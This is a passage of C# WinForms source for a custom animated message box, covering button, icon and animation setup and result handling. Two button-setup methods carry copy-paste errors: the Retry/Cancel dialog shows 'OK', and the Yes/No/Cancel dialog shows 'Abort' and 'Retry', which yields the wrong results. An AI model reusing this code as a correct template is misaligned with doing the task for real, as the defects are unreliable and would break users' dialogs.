                        _msgBox.Opacity += 0.1;
                        _msgBox.Invalidate();
                    }
                    else
                    {
                        _timer.Stop();
                        _timer.Dispose();
                    }

                    break;

                case AnimateStyle.ZoomIn:
                    if (_msgBox.Width > animate.FormSize.Width)
                    {
                        _msgBox.Width -= 17;
                        _msgBox.Invalidate();
                    }

                    if (_msgBox.Height > animate.FormSize.Height)
                    {
                        _msgBox.Height -= 17;
                        _msgBox.Invalidate();
                    }

                    break;
            }
        }

        /// <summary>
        /// The InitButtons.
        /// </summary>
        /// <param name="buttons">The buttons<see cref="Buttons"/>.</param>
        private static void InitButtons(Buttons buttons)
        {
            switch (buttons)
            {
                case Buttons.AbortRetryIgnore:
                    _msgBox.InitAbortRetryIgnoreButtons();
                    break;

                case Buttons.OK:
                    _msgBox.InitOKButton();
                    break;

                case Buttons.OKCancel:
                    _msgBox.InitOKCancelButtons();
                    break;

                case Buttons.RetryCancel:
                    _msgBox.InitRetryCancelButtons();
                    break;

                case Buttons.YesNo:
                    _msgBox.InitYesNoButtons();
                    break;

                case Buttons.YesNoCancel:
                    _msgBox.InitYesNoCancelButtons();
                    break;
            }

            foreach (var btn in _msgBox._buttonCollection)
            {
                btn.ForeColor = Color.White;
                btn.Font = new Font("Electrolize", 8);
                btn.Padding = new Padding(3);
                btn.FlatStyle = FlatStyle.Flat;
                btn.Height = 30;
                btn.FlatAppearance.BorderColor = Color.FromArgb(54, 193, 214);

                _msgBox._flpButtons.Controls.Add(btn);
            }
        }

        /// <summary>
        /// The InitIcon.
        /// </summary>
        /// <param name="icon">The icon<see cref="Icon"/>.</param>
        private static void InitIcon(Icon icon)
        {
            switch (icon)
            {
                case Icon.Application:
                    _msgBox._picIcon.Image = SystemIcons.Application.ToBitmap();
                    break;

                case Icon.Exclamation:
                    _msgBox._picIcon.Image = SystemIcons.Exclamation.ToBitmap();
                    break;

                case Icon.Error:
                    _msgBox._picIcon.Image = SystemIcons.Error.ToBitmap();
                    break;

                case Icon.Info:
                    _msgBox._picIcon.Image = SystemIcons.Information.ToBitmap();
                    break;

                case Icon.Question:
                    _msgBox._picIcon.Image = SystemIcons.Question.ToBitmap();
                    break;

                case Icon.Shield:
                    _msgBox._picIcon.Image = SystemIcons.Shield.ToBitmap();
                    break;

                case Icon.Warning:
                    _msgBox._picIcon.Image = SystemIcons.Warning.ToBitmap();
                    break;
            }
        }

        /// <summary>
        /// The InitAbortRetryIgnoreButtons.
        /// </summary>
        private void InitAbortRetryIgnoreButtons()
        {
            var btnAbort = new Button();
            btnAbort.Text = "Abort";
            btnAbort.Click += ButtonClick;

            var btnRetry = new Button();
            btnRetry.Text = "Retry";
            btnRetry.Click += ButtonClick;

            var btnIgnore = new Button();
            btnIgnore.Text = "Ignore";
            btnIgnore.Click += ButtonClick;

            _buttonCollection.Add(btnAbort);
            _buttonCollection.Add(btnRetry);
            _buttonCollection.Add(btnIgnore);
        }

        /// <summary>
        /// The InitOKButton.
        /// </summary>
        private void InitOKButton()
        {
            var btnOK = new Button();
            btnOK.Text = "OK";
            btnOK.Click += ButtonClick;

            _buttonCollection.Add(btnOK);
        }

        /// <summary>
        /// The InitOKCancelButtons.
        /// </summary>
        private void InitOKCancelButtons()
        {
            var btnOK = new Button();
            btnOK.Text = "OK";
            btnOK.Click += ButtonClick;

            var btnCancel = new Button();
            btnCancel.Text = "Cancel";
            btnCancel.Click += ButtonClick;


            _buttonCollection.Add(btnOK);
            _buttonCollection.Add(btnCancel);
        }

        /// <summary>
        /// The InitRetryCancelButtons.
        /// </summary>
        private void InitRetryCancelButtons()
        {
            var btnRetry = new Button();
            btnRetry.Text = "OK";
            btnRetry.Click += ButtonClick;

            var btnCancel = new Button();
            btnCancel.Text = "Cancel";
            btnCancel.Click += ButtonClick;


            _buttonCollection.Add(btnRetry);
            _buttonCollection.Add(btnCancel);
        }

        /// <summary>
        /// The InitYesNoButtons.
        /// </summary>
        private void InitYesNoButtons()
        {
            var btnYes = new Button();
            btnYes.Text = "Yes";
            btnYes.Click += ButtonClick;

            var btnNo = new Button();
            btnNo.Text = "No";
            btnNo.Click += ButtonClick;


            _buttonCollection.Add(btnYes);
            _buttonCollection.Add(btnNo);
        }

        /// <summary>
        /// The InitYesNoCancelButtons.
        /// </summary>
        private void InitYesNoCancelButtons()
        {
            var btnYes = new Button();
            btnYes.Text = "Abort";
            btnYes.Click += ButtonClick;

            var btnNo = new Button();
            btnNo.Text = "Retry";
            btnNo.Click += ButtonClick;

            var btnCancel = new Button();
            btnCancel.Text = "Cancel";
            btnCancel.Click += ButtonClick;

            _buttonCollection.Add(btnYes);
            _buttonCollection.Add(btnNo);
            _buttonCollection.Add(btnCancel);
        }

        /// <summary>
        /// The ButtonClick.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private static void ButtonClick(object sender, EventArgs e)
        {
            var btn = (Button)sender;

            switch (btn.Text)
            {
                case "Abort":
                    _buttonResult = DialogResult.Abort;
                    break;

                case "Retry":
                    _buttonResult = DialogResult.Retry;
                    break;

                case "Ignore":
                    _buttonResult = DialogResult.Ignore;
                    break;

                case "OK":
                    _buttonResult = DialogResult.OK;
                    break;

                case "Cancel":
                    _buttonResult = DialogResult.Cancel;
                    break;

                case "Yes":
                    _buttonResult = DialogResult.Yes;
                    break;

                case "No":
                    _buttonResult = DialogResult.No;
                    break;
            }

            _msgBox.Dispose();
        }

        /// <summary>
        /// The MessageSize.
        /// </summary>
        /// <param name="message">The message<see cref="string"/>.</param>
        /// <returns>The <see cref="Size"/>.</returns>
        private static Size MessageSize(string message)
        {
            var g = _msgBox.CreateGraphics();
            var width = 350;
            var height = 230;

            var size = g.MeasureString(message, new Font("Electrolize", 10));

            if (message.Length < 150)
                if ((int)size.Width > 350)
                    width = (int)size.Width;

            return new Size(width, height);
        }

        /// <summary>
        /// The OnPaint.
        /// </summary>
        /// <param name="e">The e<see cref="PaintEventArgs"/>.</param>
        protected override void OnPaint(PaintEventArgs e)
        {
            base.OnPaint(e);

            var g = e.Graphics;
            var rect = new Rectangle(new Point(0, 0), new Size(Width - 1, Height - 1));
            var pen = new Pen(Color.FromArgb(54, 193, 214));

            g.DrawRectangle(pen, rect);
        }
    }

    /// <summary>
    /// Defines the <see cref="AnimateMsgBox" />.
    /// </summary>
    internal class AnimateMsgBox
    {
        /// <summary>
        /// Defines the FormSize.
        /// </summary>
        public Size FormSize;

        /// <summary>
        /// Defines the Style.
        /// </summary>
        public MsgBox.AnimateStyle Style;

        /// <summary>
        /// Initializes a new instance of the <see cref="AnimateMsgBox"/> class.
        /// </summary>
        /// <param name="formSize">The formSize<see cref="Size"/>.</param>
        /// <param name="style">The style<see cref="MsgBox.AnimateStyle"/>.</param>
        public AnimateMsgBox(Size formSize, MsgBox.AnimateStyle style)
        {
            FormSize = formSize;
            Style = style;
        }
    }
}
